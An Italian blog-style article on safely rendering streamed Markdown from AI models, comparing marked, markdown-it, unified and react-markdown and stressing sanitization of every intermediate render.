Metà del Markdown renderizzato in un browser oggi arriva pochi caratteri alla volta, da un modello, tramite uno stream. Ogni approccio ingenuo a questo è lo stesso approccio: aggiungi il chunk a un buffer, ri-renderizza l'intero buffer, imposta `innerHTML`. Funziona in una demo e fallisce in quattro modi specifici.

**Il documento è sintatticamente non valido la maggior parte del tempo.** Il Markdown non ha un parsing parziale. Un buffer che finisce con un apritore di fence significa che tutto quello che segue è un blocco di codice, quindi una tabella che arriva dentro un esempio delimitato si renderizza come codice, poi come tabella, poi di nuovo come codice quando arriva il fence di chiusura. Un `[label](htt` digitato a metà è testo letterale in un frame e un link in quello dopo. Una tabella la cui riga di delimitazione non è ancora arrivata è un paragrafo di caratteri pipe. Un singolo `*` alla fine del buffer è un asterisco letterale finché non appare il suo compagno, e il resto del paragrafo diventa corsivo. Niente di tutto ciò è un bug del parser — il parser sta renderizzando correttamente un documento che è genuinamente incompleto.

**Sostituire `innerHTML` a ogni frame distrugge lo stato della pagina.** La selezione del testo si perde, un `<details>` aperto si chiude, il focus si sposta, e un utente che ha scrollato in su per leggere qualcosa viene tirato giù di nuovo. È anche la cosa più costosa che puoi fare per ogni token, perché stai buttando via un DOM che stai per ricostruire quasi identico.

**Il costo è quadratico.** Ri-analizzare e ri-sanificare l'intero buffer a ogni chunk significa che il lavoro per chunk cresce con la lunghezza della risposta. Una risposta breve va bene; una di duemila parole con cento chunk significa gli ultimi cento render che fanno ognuno quasi tutto il lavoro dell'ultimo.

**È facile saltare la sanificazione sui render intermedi.** Sanificare solo l'HTML finale è un buco con un timer sopra: ogni frame prima dell'ultimo ha messo HTML non sanificato nella pagina, e un gestore `onerror` scatta nel momento in cui viene analizzato, non quando lo stream finisce.

Quello che funziona invece è un piccolo insieme di regole:

1. **Renderizza su un orologio, non su un chunk.** Fondi i chunk e renderizza al massimo una volta per frame di animazione, o ogni 50-100 millisecondi. Il testo arriva più veloce di quanto chiunque lo legga.
2. **Dividi il buffer in stabilito e vivo.** Tutto fino all'ultima riga vuota che non è dentro un fence aperto non cambierà più. Renderizzalo una volta, tienilo nel DOM, e ri-renderizza solo la coda dopo di esso. Questo trasforma il costo quadratico di nuovo in uno lineare.
3. **Tieni traccia tu stesso dello stato dei fence.** Conta gli apritori di fence nel buffer; se il conteggio è dispari, sei dentro un blocco di codice. O lo chiudi per il render intermedio o renderizzi la coda come semplice `<pre>` finché non arriva il vero fence di chiusura. Entrambe le opzioni sono più stabili che lasciare indovinare al parser.
4. **Sanifica ogni render, non l'ultimo.** La allow-list costa microsecondi contro una coda di poche centinaia di caratteri. Non esiste una versione di questo dove un render parziale è esente.
5. **Preferisci un renderer a componenti se sei in React.** `react-markdown` riconcilia un DOM virtuale contro quello precedente e applica la patch della differenza, che è esattamente il problema che lo streaming crea, ed è il motivo per cui regge sotto uno stream dove un ciclo `innerHTML` grezzo no.
6. **Non passare a un albero sintattico aspettandoti che aiuti.** Anche unified ri-analizza da zero. Un albero ti compra le trasformazioni, non il parsing incrementale.

Quando lo stream finisce e hai il testo finale, renderizzalo di nuovo da capo, in modo pulito. Quell'ultimo render è quello che viene salvato, copiato o esportato, e non dovrebbe portarsi dietro i compromessi di cui aveva bisogno quello dal vivo — [trasformare l'output di un modello in una pagina che qualcuno può leggere](/blog/ai-output-to-a-shareable-page) è un lavoro diverso dal mostrarlo mentre arriva.

## Dove un albero sintattico è la risposta sbagliata

La pipeline unified è l'opzione più capace qui e raccomandarla di default è l'errore più comune in questo argomento. Costa più di quanto dicano i suoi sostenitori, in quattro modi.

**Sono sette dipendenze prima ancora di scrivere una riga.** `unified`, `remark-parse`, `remark-gfm`, `remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-stringify` — ognuna con il suo ritmo di release, il suo changelog e la sua versione maggiore che prima o poi si muoverà senza le altre. marked è un pacchetto solo. In un'applicazione con una revisione di sicurezza, una politica di supply-chain o un lockfile che qualcuno legge davvero, sette contro uno è un numero che viene sollevato.

**È solo ESM.** Lo dicono i pacchetti stessi. In una build moderna non è un problema; in un servizio CommonJS, un bundler più vecchio o un test runner configurato anni fa, è una giornata di lavoro che non ha niente a che fare col Markdown.

**C'è più da risolvere e valutare al momento dell'import.** Sette pacchetti e le loro proprie dipendenze devono essere trovati ed eseguiti prima che il primo documento venga analizzato, dove marked è uno solo. Non abbiamo misurato la differenza e non ti chiederemmo di fidarti del nostro numero se l'avessimo fatto; è la forma del costo che conta. Su un server a lunga esecuzione viene pagato una volta e sparisce; in una funzione serverless viene pagato a ogni avvio a freddo, per regione, per sempre.

**Ha una vera curva di apprendimento per un primo compito piccolo.** Aggiungere una classe a ogni `<h2>` significa sapere che questo è un lavoro hast, non mdast, che vuoi un plugin che restituisce un transformer, che `unist-util-visit` è un pacchetto separato, e che le proprietà del nodo sono `properties` con `className` come array. La regola equivalente del renderer di markdown-it è di quattro righe e richiede un solo concetto. Se la tua lista di trasformazioni è “aggiungi id ai titoli” e “aggiungi `rel` ai link esterni”, entrambe le altre librerie lo fanno senza un albero, e tu avrai installato un compilatore per cambiare due stringhe.

Vale anche il contrario, ed è il fallimento contro cui questo articolo esiste per mettere in guardia nella direzione opposta: se ti ritrovi a eseguire un'espressione regolare sull'HTML renderizzato — sostituendo `<h2>`, facendo corrispondere `<a href="` , contando `<img` — ti serviva l'albero e ne hai costruito uno peggiore. L'HTML non è un linguaggio regolare, e ognuna di quelle sostituzioni è corretta finché qualcuno non scrive un blocco di codice che contiene la stringa che stai cercando.

La posizione onesta è che la maggior parte delle pagine renderizza un documento, una volta, e non lo trasforma mai. Per quelle pagine la pipeline è codice di setup che leggerai per sempre senza guadagno, e la risposta giusta è la piccola libreria più un sanificatore. Prendi in mano unified quando sai nominare la trasformazione, non quando sospetti che potresti volerne una.

## Come scegliere

1. **Decidi se trasformerai il documento o lo renderizzerai soltanto.** Se una trasformazione esiste in qualche parte dei tuoi requisiti, scegli un albero fin da ora, perché aggiungerne uno dopo significa riscrivere ogni personalizzazione che hai fatto contro i token o i metodi del renderer.
2. **Fai corrispondere il dialetto ai file che hai davvero.** Converti un documento reale — uno con una tabella, una lista di attività e una nota a piè di pagina — prima di committare, perché un'estensione mancante non dà errore, renderizza la tua tabella come un paragrafo di pipe.
3. **Scegli il sanificatore prima del parser.** Il sanificatore deve girare ovunque giri il parser, e DOMPurify senza un DOM restituisce il tuo input invariato, quindi questo vincolo decide più sulla forma del tuo codice di quanto faccia la scelta del parser.
4. **Conta i runtime.** Renderizzare nel browser e sul server significa una sola allow-list importata da entrambi, e una differenza tra i due si manifesta come un documento che appare diverso quando viene condiviso rispetto a quando è stato scritto — il che si legge come perdita di dati per chi l'ha scritto.
5. **Nomina chi scrive l'input.** Se è il tuo proprio team con accesso al commit, MDX e l'HTML grezzo sono disponibili per te. Se è chiunque altro, non lo sono, e nessuna quantità di cura nella configurazione cambia quella risposta.
6. **Guarda cosa dovrai sovrascrivere.** Scrivi le quattro cose che sai già di aver bisogno — id dei titoli, gestione dei link esterni, evidenziazione del codice, caricamento lento delle immagini — e controlla ognuna contro i punti di estensione della libreria prima di scegliere, non dopo.
7. **Testa con un file ostile, non un README.** Un documento che contiene `<script>`, un attributo `onerror`, un link `javascript:` e un tag `<base>` richiede un minuto per essere scritto e ti dice più sulla tua pipeline di una settimana passata a renderizzare la tua propria documentazione.

## Cosa farne

Scrivi la allow-list prima del renderer, e chiama il sanificatore nella stessa funzione del parsing, così nessuno può raggiungere l'uno senza l'altro. Servi anche l'output fornito dagli utenti sotto una content security policy: `script-src 'none'` non costa nulla su una pagina che è sempre e solo un documento. Se l'input è un file Word invece di Markdown, è una libreria diversa e un insieme diverso di fallimenti — [mammoth e gli altri parser docx](/blog/mammoth-js-and-docx-parsers) lo trattano. Poi scegli in base alla forma del problema invece che alla popolarità della risposta: marked per una stringa, markdown-it per un plugin, unified per un albero, react-markdown per i componenti, e un sanificatore dedicato in tutti e quattro i casi. Se ti serviva l'HTML una volta sola invece di una libreria nel tuo bundle, [questa conversione](/) esegue gli stessi due passaggi nel tuo browser e ti restituisce un file autonomo.

## FAQ

### Qual è più veloce, marked o markdown-it?

Non abbiamo eseguito un benchmark e non dovresti scegliere sulla base di quello di qualcun altro. Entrambi sono parser maturi scritti per lo stesso lavoro, e in qualsiasi uso interattivo — un pannello di anteprima, una casella commenti, una pagina — la differenza non è quello che noterai. Diventa una cosa da misurare quando stai renderizzando migliaia di documenti in una build, e a quel punto misura i tuoi propri documenti, perché la risposta dipende da cosa c'è dentro piuttosto che da un numero preso dal README di un repository.

### marked è sicuro da usare su Markdown non fidato?

Non da solo. Il suo README dice apertamente che non sanifica il suo output e ti rimanda a DOMPurify, sanitize-html o insane (verificato su github.com, il 9 settembre 2026). La vecchia opzione `sanitize` è stata rimossa, quindi il codice che la passa viene ignorato in silenzio, il che è peggio che non avere alcuna protezione perché sembra protezione.

### Come aggiungo id ai titoli per un indice?

In marked, sovrascrivi il metodo renderer `heading` o aggiungi il pacchetto `marked-gfm-heading-id`. In markdown-it, usa un plugin di ancore o sovrascrivi la regola renderer `heading_open`. In unified, aggiungi un plugin che percorre l'albero. Qualunque cosa tu scelga, metti un prefisso all'id — un id nudo diventa una proprietà con nome su `window`, e un prefisso come `doc-` chiude sia la collisione sia il rischio di clobbering.

### Perché la mia tabella si renderizza come un paragrafo di pipe?

Le tabelle non sono in CommonMark, quindi un parsing strettamente conforme non ne produce una. Controlla `gfm` in marked, controlla di non aver selezionato il preset `commonmark` in markdown-it, e controlla che `remark-gfm` sia nella tua pipeline unified. Il fallimento è silenzioso per progetto: una tabella che il parser non riconosce è un paragrafo valido.

### Mi serve rehype-raw?

Solo se il Markdown contiene HTML grezzo che vuoi renderizzato. `remark-rehype` altrimenti scarta l'HTML grezzo, il che è il default sicuro. Se lo aggiungi, ti serve anche `allowDangerousHtml` su `remark-rehype`, e poi `rehype-sanitize` dopo entrambi — il centro di quella sequenza è la parte dove esiste un documento non sanificato.

### Posso usare queste librerie in un browser senza un bundler?

Sì. marked, markdown-it, micromark e snarkdown girano tutti in un browser e possono essere caricati da un CDN come moduli ES. I pacchetti unified sono solo ESM, il che li rende semplici come moduli e scomodi come tag script. Ricorda che anche un sanificatore deve essere caricato — un renderer da solo nella pagina è il buco di cui parla questo articolo.

### Qual è la differenza tra remark e rehype?

Sono due metà della stessa pipeline che lavorano su due alberi diversi. remark lavora su mdast, l'albero Markdown, dove i nodi sono titoli, liste e link. rehype lavora su hast, l'albero HTML, dove i nodi sono elementi con nomi di tag e proprietà. `remark-rehype` è il ponte, e sapere su quale lato vive il tuo problema è la maggior parte dell'imparare unified.
